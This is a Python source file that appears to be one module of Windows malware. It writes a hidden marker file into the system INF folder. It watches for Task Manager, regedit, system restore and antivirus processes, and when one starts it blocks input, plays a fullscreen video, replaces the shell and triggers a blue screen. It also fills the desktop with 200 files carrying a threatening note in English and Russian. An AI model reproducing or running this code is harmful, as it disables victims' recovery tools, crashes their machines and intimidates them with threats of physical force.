import ctypes
import os
import pygame
import random
import threading
import sys
import win32gui
import time
import psutil
import win32con
from moviepy.editor import VideoFileClip
from regedit_and_virus_safe import BSOD, change_shell_aftervideo
from start_gdi import stop_event

def resource_path(relative_path):
    if hasattr(sys, '_MEIPASS'):
        base_path = os.path.join(sys._MEIPASS, "resources")
    else:
        base_path = os.path.join(os.path.abspath("."), "resources")
    return os.path.join(base_path, relative_path)

###
file_path = r"C:\Windows\INF\iaLPSS2i_mausbhost_CNL.inf"
###

def set_wallpaper(image_path):
    image_path = os.path.abspath(image_path)
    ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 3)

def set_window_always_on_top(window_title="MoviePy"):
    # Функция в цикле ищет окно с указанным заголовком и устанавливает его как topmost.
    # Ждем появления окна
    while True:
        hwnd = win32gui.FindWindow(None, window_title)
        if hwnd:
            # Устанавливаем окно поверх всех
            win32gui.SetWindowPos(hwnd, win32con.HWND_TOPMOST, 0, 0, 0, 0,
                                  win32con.SWP_NOMOVE | win32con.SWP_NOSIZE)
            break
        time.sleep(0.1)

def remove_file_attributes(file_path):
    # Удаление атрибутов скрытого и системного
    os.system(f'attrib -s -h "{file_path}"')

def set_file_attributes(file_path):
    # Устанавливаем атрибуты скрытый и системный
    ctypes.windll.kernel32.SetFileAttributesW(file_path, 0x02 | 0x04)


def change_txt_2():
    remove_file_attributes(file_path)
    with open(file_path, "w") as f:
        f.write("2")
        set_file_attributes(file_path)

def change_txt_3():
    remove_file_attributes(file_path)
    with open(file_path, "w") as f:
        f.write("3")
        set_file_attributes(file_path)

def play_video_fullscreen(video_path):
    def get_screen_size():
        user32 = ctypes.windll.user32
        user32.SetProcessDPIAware()
        screen_width = user32.GetSystemMetrics(0)
        screen_height = user32.GetSystemMetrics(1)
        return screen_width, screen_height

    # Блокируем ввод
    ctypes.windll.user32.BlockInput(True)
    stop_event.set()
    screen_width, screen_height = get_screen_size()  # Получаем разрешение экрана

    # Загружаем видео и меняем его размер под разрешение экрана
    clip = VideoFileClip(video_path)
    clip_resized = clip.resize(width=screen_width, height=screen_height)

    def preview_video():
        # Воспроизводим видео в полноэкранном режиме с включенным звуком
        clip_resized.preview(fullscreen=True, audio=True)
        clip_resized.close()  # Закрываем клип после завершения

    # Запускаем воспроизведение видео в отдельном потоке
    video_thread = threading.Thread(target=preview_video)
    video_thread.start()

    # Параллельно запускаем поток для установки окна поверх всех
    top_thread = threading.Thread(target=set_window_always_on_top)
    top_thread.start()

    # Ждем завершения обоих потоков
    video_thread.join()
    top_thread.join()

    # После завершения воспроизведения вызываем run_app()
    ctypes.windll.user32.BlockInput(False)
    change_txt_3()
    change_shell_aftervideo()
    time.sleep(0.5)
    BSOD()


def playMusic_runappmain():
    pygame.mixer.music.load(resource_path("runapp_main.MP3"))  # Загружаем музыку
    pygame.mixer.music.play(-1)  # Воспроизведение (-1 означает бесконечный повтор)


def playMusic_after50():
    pygame.mixer.stop()
    pygame.mixer.music.load(resource_path("after50.mp3"))  # Загружаем музыку
    pygame.mixer.music.play(-1)  # Воспроизведение (-1 означает бесконечный повтор)


def playmusic_for3():
    pygame.mixer.stop()
    pygame.mixer.music.load(resource_path("scaryfor3.MP3"))  # Загружаем музыку
    pygame.mixer.music.play(-1)  # Воспроизведение (-1 означает бесконечный повтор)


def monitor_process(processes=["regedit.exe", "mmc.exe", "msconfig.exe", "SystemPropertiesProtection.exe", "rstrui.exe", "RecoveryDrive.exe", "taskmgr.exe", "powershell.exe", "OpenConsole.exe", "mrt.exe", "resmon.exe", "perfmon.exe", "SecHealthUI.exe", "ProcessHacker.exe", "SimpleUnlocker.exe,"
"SystemInformer.exe", "ProcessExplorer.exe", "Avast.exe", "Drweb.exe", "Kaspersky.exe"]):
    triggered = False
    while True:
        found = any(p.info['name'] in processes for p in psutil.process_iter(['name']))
        if found and not triggered:
            triggered = True
            play_video_fullscreen(resource_path("Hacker2.mp4"))
        time.sleep(1)

text = """[EN]

The hacker group "Assault on the Armchair Troops" welcomes you. If you listened and watched the speech from our mentor carefully, then most likely you will not have any questions. If you did not consider it necessary to carefully read the instructions from our boss, then we can remind you of them, but first we want to say that we are watching you, and if we see something we do not like, your computer will be completely destroyed. But let's move on to the rules:
1. Do not try to remove our malware, this will not help anyway, since not only your computer is infected, but also your Internet traffic, therefore, you will only destroy the computer. Is this what you want?
2. Do not press the key combination ctrl + alt + del. No comments here. Some decided to ignore this rule, we had to send cars for them to resolve issues by force, if you know what we mean.
3. Open as few files as possible, because the more files you open, the greater the chance that we will take some measures against you.
You have a long, long, difficult path ahead, but, of course, bad consequences can be avoided by simply following these rules. And remember - we always see and notice everything.

[RU]

Хакерская группировка "Штурм кабинетных войск" приветствует вас. Если вы внимательно слушали и смотрели речь от нашего наставника, то скорее всего, вопросов у вас не возникнет. Если же вы не посчитали нужным внимательно ознакомиться с инструкциями от нашего босса, то мы может напомнить вам их, но прежде мы хотим сказать, что мы наблюдаем за вами, и если мы увидим то, что нам не нравится - вам компьютер будет полностью уничтожен. Но перейдем к правилам:
1. Не пытайтесь удалить наше вредоносное ПО, это все равно не поможет, так как заражен не только ваш компьютер, но и интернет-трафик тоже, следовательно, вы только уничтожите компьютер. Вы этого хотите?
2. Не нажимайте комбинацию клавиш ctrl + alt + del. Тут без комментариев. Некоторые решили проигнорировать это правило, пришлось отправлять за ними машины, для решения вопросов силой, если вы понимаете, про что мы.
3. Открывайте как можно меньше файлов, ведь чем больше файлов вы откроете, тем больше шанс того, что мы примем некоторые меры в отношении вас.
Вам предстоит долгий и долгий сложный путь, но, конечно, плохих последствий можно избежать, просто следуя этим правилам. И помните - мы всегда всё видим и замечаем."""



def create_random_files(num_files=200, desktop_path=None):
    """Создает заданное количество случайных файлов на рабочем столе"""
    if desktop_path is None:
        desktop_path = os.path.join(os.environ['USERPROFILE'], 'Desktop')

    def generate_random_filename(extension, length=8):
        """Генерирует случайное имя файла с заданной длиной и заданным расширением"""
        chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
        return ''.join(random.choices(chars, k=length)) + extension
    try:
        for _ in range(num_files):  # Создаем заданное количество файлов
            # Случайно выбираем расширение
            if random.choice([True, False]):
                extension = '.exe'
                file_path = os.path.join(desktop_path, generate_random_filename(extension))
                with open(file_path, 'wb') as f:
                    pass
                print(f'Создан файл: {file_path}')
            else:
                extension = '.txt'
                file_path = os.path.join(desktop_path, generate_random_filename(extension))

                # Создаем текстовый файл
                with open(file_path, 'w', encoding='utf-8') as f:
                    f.write(text)
                print(f'Создан файл: {file_path}')
    except Exception as e:
        print(f'Остановлено из-за ошибки: {str(e)}')

        